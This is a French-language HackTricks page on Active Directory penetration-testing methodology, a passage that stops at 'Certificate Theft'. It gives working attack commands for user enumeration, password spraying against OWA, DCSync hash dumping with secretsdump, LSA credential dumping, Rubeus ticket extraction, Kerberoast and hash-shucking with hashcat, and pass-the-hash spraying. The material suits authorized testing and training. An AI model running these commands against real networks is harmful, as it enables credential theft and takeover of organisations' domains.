# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d'un réseau. Il est conçu pour être scalable, facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure d'**Active Directory** se compose de trois couches principales : **domaines**, **arbres**, et **forêts**. Un **domaine** englobe une collection d'objets, tels que des **utilisateurs** ou des **périphériques**, partageant une base de données commune. Les **arbres** sont des groupes de ces domaines reliés par une structure commune, et une **forêt** représente l'ensemble de plusieurs arbres, interconnectés via des **relations de confiance**, formant la couche la plus haute de la structure organisationnelle. Des **droits d'accès** et de **communication** spécifiques peuvent être définis à chacun de ces niveaux.

Concepts clés au sein d'**Active Directory** :

1. **Annuaire** – Contient toutes les informations relatives aux objets d'Active Directory.
2. **Objet** – Désigne les entités dans l'annuaire, y compris les **utilisateurs**, **groupes**, ou **partages**.
3. **Domaine** – Sert de conteneur pour les objets de l'annuaire ; plusieurs domaines peuvent coexister dans une **forêt**, chacun maintenant sa propre collection d'objets.
4. **Arbre** – Regroupement de domaines partageant un domaine racine commun.
5. **Forêt** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs arbres avec des **relations de confiance** entre eux.

**Active Directory Domain Services (AD DS)** englobe un ensemble de services critiques pour la gestion centralisée et la communication au sein d'un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, incluant l'**authentification** et les fonctionnalités de **recherche**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications utilisant l'annuaire via le **protocole LDAP**.
4. **Directory Federation Services** – Fournit des fonctionnalités de **single-sign-on** pour authentifier les utilisateurs sur plusieurs applications web dans une même session.
5. **Rights Management** – Aide à protéger les contenus sous droits d'auteur en régulant leur distribution et utilisation non autorisées.
6. **DNS Service** – Crucial pour la résolution des **noms de domaine**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre à **attack an AD** vous devez bien comprendre le **processus d'authentification Kerberos**.  
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Fiche de référence

Vous pouvez consulter rapidement [https://wadcoms.github.io/](https://wadcoms.github.io) pour avoir une vue rapide des commandes que vous pouvez exécuter pour énumérer/exploiter un AD.

> [!WARNING]
> La communication Kerberos **requiert un nom de domaine entièrement qualifié (FQDN)** pour effectuer des actions. Si vous essayez d'accéder à une machine par son adresse IP, **cela utilisera NTLM et non Kerberos**.

## Recon Active Directory (sans identifiants/sessions)

Si vous avez seulement accès à un environnement AD mais que vous n'avez aucun identifiants/sessions, vous pouvez :

- **Pentest the network :**
  - Scannez le réseau, trouvez les machines et les ports ouverts et essayez d'**exploiter des vulnérabilités** ou d'**extraire des identifiants** depuis celles-ci (par exemple, [printers could be very interesting targets](ad-information-in-printers.md)).
  - L'énumération DNS peut fournir des informations sur des serveurs clés du domaine comme web, imprimantes, partages, vpn, media, etc.
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consultez la page générale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour plus d'informations sur la façon d'agir.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions modernes de Windows) :
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Un guide plus détaillé sur l'énumération d'un serveur SMB est disponible ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Un guide plus détaillé sur l'énumération LDAP est disponible ici (portez une **attention particulière à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
  - Récupérez des identifiants en [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Accédez à un hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Récupérez des identifiants en **exposant** des [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
  - Extrayez des noms d'utilisateur/noms complets depuis des documents internes, des réseaux sociaux, des services (principalement web) à l'intérieur des environnements du domaine ainsi que depuis les sources publiques.
  - Si vous trouvez les noms complets des employés, vous pouvez tester différentes conventions de **username AD** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
  - Outils :
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Énumération d'utilisateurs

- **Anonymous SMB/LDAP enum :** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum** : Lorsqu'un **nom d'utilisateur invalide est demandé**, le serveur répondra avec le code d'erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le nom d'utilisateur est invalide. Les **noms d'utilisateur valides** provoqueront soit un **TGT dans une réponse AS-REP**, soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer une pré-authentification.
- **No Authentication against MS-NRPC** : Utilisation d'auth-level = 1 (No authentication) contre l'interface MS-NRPC (Netlogon) sur les contrôleurs de domaine. La méthode appelle la fonction `DsrGetDcNameEx2` après le binding de l'interface MS-NRPC pour vérifier si l'utilisateur ou l'ordinateur existe sans aucune crédential. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous trouvez l'un de ces serveurs sur le réseau, vous pouvez également effectuer une **user enumeration** contre celui-ci. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez avoir le **nom des personnes travaillant dans l'entreprise** provenant de l'étape de recon que vous auriez dû effectuer auparavant. Avec le prénom et le nom de famille, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiels valides.

### Knowing one or several usernames

Ok, donc vous savez déjà qu'un nom d'utilisateur est valide mais vous n'avez pas de mots de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md): Si un utilisateur **n'a pas** l'attribut _DONT_REQ_PREAUTH_ vous pouvez **demander un message AS_REP** pour cet utilisateur qui contiendra des données chiffrées par une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md): Essayez les **mots de passe les plus courants** pour chacun des utilisateurs découverts ; peut-être qu'un utilisateur utilise un mot de passe faible (gardez la politique de mot de passe à l'esprit !).
- Notez que vous pouvez aussi **spray OWA servers** pour tenter d'accéder aux serveurs de messagerie des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être en mesure d'**obtenir** des **hashes** de challenge à craquer en effectuant du poisoning sur certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si vous avez réussi à énumérer l'active directory vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourriez être capable de forcer des attaques NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) pour obtenir l'accès à l'environnement AD.

### NetExec workspace-driven recon & relay posture checks

- Utilisez les **workspaces `nxcdb`** pour conserver l'état de recon AD par engagement : `workspace create <name>` crée des DB SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et listez les secrets collectés avec `creds`. Purgez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.
- Découverte rapide de sous-réseau avec **`netexec smb <cidr>`** qui met en évidence le **domaine**, la **build OS**, les **exigences de SMB signing**, et **Null Auth**. Les hôtes affichant `(signing:False)` sont **relay-prone**, tandis que les DCs nécessitent souvent le signing.
- Générez des noms d'hôte dans /etc/hosts directement depuis la sortie NetExec pour faciliter le ciblage :
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quand **SMB relay to the DC is blocked** par signing, probez quand même la posture **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / un weak channel binding. Un DC exigeant SMB signing mais avec LDAP signing disabled reste une cible viable de **relay-to-LDAP** pour des abus comme **SPN-less RBCD**.

### Côté client — printer credential leaks → validation en masse des identifiants de domaine

- Les UI Printer/web affichent parfois **des mots de passe admin masqués inclus dans le HTML**. Afficher la source/les devtools peut révéler le texte en clair (par ex., `<input value="<password>">`), permettant un accès Basic-auth aux répertoires de scan/print.
- Les jobs d'impression récupérés peuvent contenir des **documents d'onboarding en texte clair** avec des mots de passe par utilisateur. Veillez à garder les appariements alignés lors des tests :
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PCs ou partages** avec l'utilisateur **null or guest user** vous pouvez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés, vont **déclencher une authentification NTLM envers vous** afin que vous puissiez **voler** le **NTLM challenge** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** considère chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d'autres formats plus lents dont le matériel de clé est dérivé directement du NT hash. Plutôt que de brute-forcer de longues phrases de passe dans les tickets Kerberos RC4, les challenges NetNTLM, ou les credentials en cache, vous injectez les NT hashes dans les modes NT-candidate de Hashcat et laissez valider la réutilisation de mot de passe sans jamais connaître le texte en clair. Ceci est particulièrement efficace après une compromission de domaine où vous pouvez récolter des milliers de NT hashes actuels et historiques.

Utilisez shucking lorsque :

- Vous disposez d'un corpus NT issu de DCSync, dumps SAM/SECURITY, ou de credential vaults et devez tester la réutilisation dans d'autres domaines/forests.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM, ou des blobs DCC/DCC2.
- Vous voulez prouver rapidement la réutilisation pour des phrases de passe longues et difficiles à cracker et pivot immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas dérivées du NT hash (par ex. les etypes Kerberos 17/18 AES). Si un domaine impose AES-only, il faut revenir aux modes mot de passe réguliers.

#### Building an NT hash corpus

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec history pour récupérer le plus grand ensemble possible de NT hashes (et leurs valeurs précédentes) :

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées d'historique élargissent considérablement le pool de candidats car Microsoft peut stocker jusqu'à 24 hashes précédents par compte. Pour d'autres méthodes de récolte des secrets NTDS voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les logons de domaine en cache (DCC/DCC2). Dédupliquez et ajoutez ces hashes au même fichier `nt_candidates.txt`.
- **Tracer les métadonnées** – Gardez le nom d'utilisateur/domaine qui a produit chaque hash (même si le wordlist ne contient que des hex). Les correspondances vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
- Préférez des candidats issus du même forest ou d'un forest de confiance ; cela maximise la probabilité de recoupement lors du shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes :

- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32 hex**. Désactivez les moteurs de règles (pas de `-r`, pas de modes hybrides) car les manglings corrompent le matériel de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de clé NTLM (~30,000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT triée est beaucoup moins coûteux que d'explorer tout l'espace de mot de passe dans le format lent.
- Exécutez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 ont été ajoutés récemment.
- Il n'existe actuellement pas de mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, pas de NT hashes bruts.

#### Example – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur peu privilégié (voir la page Kerberoast pour les détails) :

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckez le ticket avec votre liste NT :

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos NT hashes existants.

3. Pivotez immédiatement via PtH :

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez optionnellement récupérer le mot de passe en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Example – Cached credentials (mode 31600)

1. Dump des logons en cache depuis une workstation compromise :

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copiez la ligne DCC2 pour l'utilisateur de domaine intéressant dans `dcc2_highpriv.txt` et shuckez-la :

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Une correspondance réussie donne le NT hash déjà connu dans votre liste, prouvant que l'utilisateur en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour récupérer la chaîne.

Le même workflow s'applique aux réponses challenge-response NetNTLM (`-m 27000/27100`) et DCC (`-m 31500`). Une fois une correspondance identifiée vous pouvez lancer des relais, SMB/WMI/WinRM PtH, ou re-cracker le NT hash avec masks/rules hors ligne.



## Enumerating Active Directory WITH credentials/session

Pour cette phase, vous devez avoir **compromis les credentials ou une session** d'un compte de domaine valide. Si vous disposez de credentials valides ou d'un shell en tant qu'utilisateur de domaine, **n'oubliez pas que les options mentionnées précédemment restent des moyens de compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée vous devez connaître le **Kerberos double hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Avoir compromis un compte est une **étape majeure pour commencer à compromettre l'ensemble du domaine**, car vous allez pouvoir démarrer l'**Active Directory Enumeration :**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver tous les utilisateurs vulnérables possibles, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les usernames** et tester le mot de passe du compte compromis, les mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pouvez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez également utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus furtif
- Vous pouvez aussi [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil remarquable pour le recon dans Active Directory est [**BloodHound**](bloodhound.md). Il n'est **pas très stealthy** (selon les méthodes de collecte utilisées), mais **si cela ne vous importe pas**, vous devriez absolument l'essayer. Trouvez où les utilisateurs peuvent RDP, trouvez des chemins vers d'autres groupes, etc.
- **Autres outils automatisés d'énumération AD :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Les enregistrements DNS de l'AD**](ad-dns-records.md) peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l'annuaire est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi rechercher dans la base LDAP avec **ldapsearch** pour chercher des credentials dans les champs _userPassword_ & _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés tels que :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les usernames du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Enumeration semble courte, c'est la partie la plus importante de toutes. Accédez aux liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à être à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou décider qu'il n'y a rien à faire.

### Kerberoast

Kerberoasting consiste à obtenir des **TGS tickets** utilisés par les services liés à des comptes utilisateurs et à cracker leur chiffrement — basé sur les mots de passe utilisateurs — **hors ligne**.

Plus d'informations :

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu des credentials, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter sur plusieurs serveurs avec différents protocoles, en fonction de vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des credentials ou une session en tant qu'utilisateur de domaine régulier et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine du domaine**, vous devriez essayer de trouver un moyen d'**escalader les privilèges localement et de fouiller les credentials**. En effet, ce n'est qu'avec des privilèges d'administrateur local que vous pourrez **dump les hashes d'autres utilisateurs** en mémoire (LSASS) et localement (SAM).

Il existe une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). De plus, n'oubliez pas d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Il est très **improbable** que vous trouviez des **tickets** dans l'utilisateur courant vous donnant la permission d'accéder à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer Active Directory vous aurez **plus d'e-mails et une meilleure compréhension du réseau**. Vous pourriez être capable de forcer NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Recherche de Creds dans les partages informatiques | SMB Shares

Maintenant que vous avez quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés dans l'AD**. Vous pouvez le faire manuellement mais c'est une tâche très ennuyeuse et répétitive (d'autant plus si vous trouvez des centaines de docs à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PC ou partages** vous pourriez **placer des fichiers** (comme un fichier SCF) qui, si quelqu'un y accède, **déclencheront une authentification NTLM contre vous** afin que vous puissiez **voler** le **NTLM challenge** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalade de privilèges sur Active Directory AVEC des identifiants/session privilégiés

**Pour les techniques suivantes, un utilisateur de domaine ordinaire ne suffit pas : vous avez besoin de privilèges/identifiants spéciaux pour effectuer ces attaques.**

### Hash extraction

Espérons que vous ayez réussi à **compromettre un compte admin local** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) y compris le relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Ensuite, il est temps d'extraire tous les hashes en mémoire et localement.  
[**Lisez cette page sur les différentes façons d'obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.  
Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, de sorte que lorsque n'importe quelle **authentification NTLM est effectuée**, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.  
[**Lisez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash courant via le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, obtenant un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si vous avez le **hash** ou le **mot de passe** d'un **administrateur local**, vous devriez essayer de **vous connecter localement** à d'autres **PCs** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que ceci est assez **bruyant** et **LAPS** l'**atténuerait**.

### MSSQL Abuse & Trusted Links

Si un utilisateur a les privilèges pour **access MSSQL instances**, il pourrait être capable de l'utiliser pour **execute commands** sur l'hôte MSSQL (si exécuté en tant que SA), **steal** le NetNTLM **hash** ou même effectuer une **relay** **attack**.\
De plus, si une instance MSSQL est trusted (database link) par une instance MSSQL différente. Si l'utilisateur a des privilèges sur la base de données trusted, il pourra **use the trust relationship to execute queries also in the other instance**. Ces trusts peuvent être chaînés et à un moment donné l'utilisateur pourrait trouver une base de données mal configurée où il peut exécuter des commandes.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Les suites tierces d'inventaire et de déploiement exposent souvent des chemins puissants vers des credentials et l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous avez des privilèges sur l'ordinateur, vous serez capable de dumper les TGTs depuis la mémoire de tous les utilisateurs qui se connectent sur l'ordinateur.\
Donc, si un **Domain Admin logins onto the computer**, vous pourrez dumper son TGT et l'usurper en utilisant [Pass the Ticket](pass-the-ticket.md).\
Grâce à constrained delegation vous pourriez même **automatically compromise a Print Server** (espérons que ce sera un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou ordinateur est autorisé pour "Constrained Delegation" il pourra **impersonate any user to access some services in a computer**.\
Ensuite, si vous **compromise the hash** de cet utilisateur/ordinateur vous serez capable de **impersonate any user** (même des domain admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avoir le privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'atteindre une exécution de code avec des **privileges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utilisateur compromis pourrait avoir des **privilèges intéressants sur certains objets du domaine** qui pourraient vous permettre de **move** latéralement/**escalate** des privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

La découverte d'un **Spool service listening** au sein du domaine peut être **abusée** pour **acquérir de nouveaux credentials** et **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **d'autres utilisateurs** **access** la machine **compromise**, il est possible de **gather credentials from memory** et même **inject beacons in their processes** pour les usurper.\
Généralement les utilisateurs accéderont au système via RDP, voici donc comment effectuer quelques attaques sur des sessions RDP tierces :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système pour gérer le **local Administrator password** sur les ordinateurs joints au domaine, en s'assurant qu'il est **randomized**, unique et fréquemment **changed**. Ces mots de passe sont stockés dans Active Directory et l'accès est contrôlé via des ACLs uniquement pour les utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d'autres ordinateurs.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** depuis la machine compromise peut être un moyen d'escalader les privilèges à l'intérieur de l'environnement :


{{#ref}}
